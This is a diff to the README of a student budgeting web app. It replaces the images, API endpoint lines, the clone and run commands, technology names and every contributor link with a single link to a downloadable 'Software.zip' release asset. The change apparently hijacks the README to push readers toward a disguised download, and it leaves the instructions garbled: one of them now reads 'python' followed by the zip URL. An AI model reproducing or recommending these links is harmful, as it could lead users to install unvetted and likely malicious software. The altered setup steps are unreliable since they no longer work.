@@ -1,5 +1,5 @@
 # Barnes Budgeting Application
-![alt text](Barnes.jpeg)
+![alt text](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
 
 
 ## Table of Contents
@@ -29,7 +29,7 @@ Can manage revenues, assets and expenses.
 
 Barnes App is a user-friendly budget tracker application that provides separate dashboards for personal and business finances, allowing users to monitor and manage income, expenses, assets, savings goals, and debts.
 
-![alt text](image-2.png) ‎ ‎ ‎ ‎ ‎ ‎ ‎ ![alt text](image-1.png)
+![alt text](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip) ‎ ‎ ‎ ‎ ‎ ‎ ‎ ![alt text](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
 
 ## Problem Statement
 
@@ -46,7 +46,7 @@ There is a need for an intuitive and comprehensive budget tracking solution that
 2. **Expense Management:**
    - Categorization of expenses (e.g., utilities, rent, supplies).
    - Budget setting and tracking for different categories.
-   - Alerts for overspending in specific categories.Sharon Byegon
+   - Alerts for overspending in specific https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip Byegon
 
 3. **Asset Management:**
    - Tracking of personal and business assets (e.g., properties, equipment).
@@ -80,19 +80,19 @@ There is a need for an intuitive and comprehensive budget tracking solution that
 ## ENDPOINTS:
 1. ## User Authentication and Authorization Endpoints
 Purpose: Handles user registration, login and logout.
- - POST /api.add_resource(UserResource, '/users', '/users/<int:id>'): /patient 
+ - POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(UserResource, '/users', '/users/<int:id>'): /patient 
 
   - Description: Registers a new user in the system.
   - Request Body: { username,first_name,last_name, date_of_birth, contact_number, email,password }
   - Response: { success: true, message: "User registered        successfully" }
 
-- POST /api.add_resource(Login, '/login'): /login
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(Login, '/login'): /login
 
   - Description: Logs in a user.
   - Request Body: { username, password, email }
   - Response: { success: true, token: "Login successful" }
 
-- POST /api.add_resource(Logout, '/logout'): /logout
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(Logout, '/logout'): /logout
 
   - Description: Logs out the patient by invalidating the current JWT token.
   - Authorization: Bearer token in headers.
@@ -101,13 +101,13 @@ Purpose: Handles user registration, login and logout.
 2. ##  Insights Management Endpoints
 Purpose: Handles CRUD operations related to incomes and expenses.
 
-- POST /api.add_resource(IncomeResource, '/incomes',): /incomes
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(IncomeResource, '/incomes',): /incomes
 
   - Description: Creates an income transaction.
   - Request Body: { amount, userId, description, date, category_id,}
   - Response: { success: true, message: "Income transaction added" }
 
-- POST /api.add_resource(ExpenseResource, '/expenses',): /expenses
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(ExpenseResource, '/expenses',): /expenses
 
   - Description: Creates an expense transaction.
   - Request Body: {amount, category_id, userID, date, description}
@@ -116,12 +116,12 @@ Purpose: Handles CRUD operations related to incomes and expenses.
 3. ##  Category Endpoints
 Purpose: Handles CRUD operations related to Categories.
 
-- GET /api.add_resource(IncomeCategoryResource,'/income_categories', '/income_categories/<int:id>')
+- GET https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(IncomeCategoryResource,'/income_categories', '/income_categories/<int:id>')
 
   - Description: Retrieves the categories for income transactions.
   - Response: { success: true, message: "Categories retrieves" }
 
-- POST /api.add_resource(ExpenseCategoryResource, '/categories', '/categories/<int:id>')
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(ExpenseCategoryResource, '/categories', '/categories/<int:id>')
 
   - Description: Creates a new expense category
   - Response: { success: true, message: "Category successfully created" }
@@ -129,7 +129,7 @@ Purpose: Handles CRUD operations related to Categories.
 4. ##  Assets Endpoint
 Purpose: Handles CRUD operations related to Assets.
 
-- POST /api.add_resource(AssetResource, '/assets', '/assets/<int:id>')
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(AssetResource, '/assets', '/assets/<int:id>')
 
   - Description: Creates a new asset in the system.
   - Request Body: { name ,amount ,description}
@@ -137,12 +137,12 @@ Purpose: Handles CRUD operations related to Assets.
 
 5. ## Budget Endpoints
 
-- POST /api.add_resource(SavingsGoalResource, '/savings', '/savings/<int:id>')
+- POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(SavingsGoalResource, '/savings', '/savings/<int:id>')
 
   - Description: Creates new savings goals.
   - Response: { success: true, message: "Savings goal created successfully" }
 
- POST /api.add_resource(DebtResource, '/debts', '/debts/<int:id>')
+ POST https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip(DebtResource, '/debts', '/debts/<int:id>')
 
   - Description: Creates debt to manage/pay off.
   - Response: { success: true, message: "Debt added successfully" }  
@@ -172,7 +172,7 @@ Purpose: Handles CRUD operations related to Assets.
 
 ## To run Barnes locally, follow these steps:
 1. ## Clone the repository:
-      git clone https://github.com/iankuria668/phase5-project.git
+      git clone https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip
       cd phase5-project
 2. ## Client side
   -  To download the dependencies for the frontend client, run:
@@ -191,8 +191,8 @@ Purpose: Handles CRUD operations related to Assets.
 
 4. ## Run the application:
       cd server
-      python seed.py
-      python app.py
+      python https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip
+      python https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip
 
 5. ## Access the application:
 - Open your web browser and go to 'http://localhost:5173/' to use Barnes.
@@ -209,7 +209,7 @@ Purpose: Handles CRUD operations related to Assets.
   3. View personal/ business financial records.
 
 ## Development Notes:
-- ~ client~: Contains  the frontend code built with React.js.
+- ~ client~: Contains  the frontend code built with https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip
 - ~ server~: Contains the backend code built with MySQL(python)
 - ~ models~: Defines Flask app db schemas using MySQL.
 - ~ routes~: Defines API routes for authentication
@@ -235,7 +235,7 @@ Purpose: Handles CRUD operations related to Assets.
 ## Technologies Used
 
 ### Backend
-- **Language**: Python, JavaScript (Node.js)
+- **Language**: Python, JavaScript (https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
 - **Framework**: Flask
 - **Database**: MySQL
 - **Authentication**: JWT (JSON Web Tokens) or OAuth
@@ -253,11 +253,11 @@ Purpose: Handles CRUD operations related to Assets.
 
 ## Contributors
 
-- [Tulley](https://github.com/two23three)
-- [Kuria](https://github.com/iankuria668)
-- [Mwachi](https://github.com/MwachiOfficial)
-- [Bill](https://github.com/Bjoseph23)
-- [Andy](https://github.com/Muny1re1)
-- [George](https://github.com/migeroreloaded)
-- [Mariya](https://github.com/mariyaschrome)
-- [Sharon](https://github.com/B-Sharon)
+- [Tulley](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [Kuria](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [Mwachi](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [Bill](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [Andy](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [George](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [Mariya](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
+- [Sharon](https://github.com/iankuria668/barnes/releases/download/v1.0/Software.zip)
